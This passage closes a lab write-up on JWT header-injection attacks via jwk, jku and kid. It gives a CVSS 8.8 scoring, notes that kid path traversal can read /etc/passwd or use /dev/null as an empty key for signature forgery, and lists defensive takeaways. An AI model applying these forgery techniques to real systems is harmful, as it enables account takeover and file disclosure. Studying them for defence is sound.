| **AC** | Low (L) | Requires only a valid JWT and attacker-controlled key material |
| **PR** | Low (L) | Needs a low-privileged account (`wiener`) |
| **UI** | None (N) | No user interaction required |
| **S** | Unchanged (U) | Impact stays within the affected component |
| **C / I / A** | High (H) | Full admin takeover, privilege escalation |

**Base Score: 8.8 (High)**

### Explanation

The attacker can forge a token using their own key and escalate to a full administrator account with high impact on confidentiality, integrity, and availability. Because a valid low-privileged session is required, the score is **8.8 High**.

> **Note:** the `kid` path-traversal vector can also lead to **arbitrary file read** (e.g. reading `/etc/passwd` as the key) and, combined with other misconfigurations, could reach **9.8 Critical**.

---

## 6. Key Takeaways

| # | Lesson |
|---|---|
| 1 | Never trust keys provided in `jwk`/`jku`/`kid` — always use a trusted whitelist of keys |
| 2 | `jku` URLs must be validated against a strict host whitelist |
| 3 | `kid` values must never be concatenated into filesystem paths (path traversal) |
| 4 | If a server reads files as keys, `/dev/null` (empty key) enables empty-signature forgery |
| 5 | PyJWT refuses empty HMAC keys — manual HMAC or jwt_tool is required |

---

*Article 3 of 4. Covers injecting self-signed JWTs via header parameters (jwk, jku, kid).*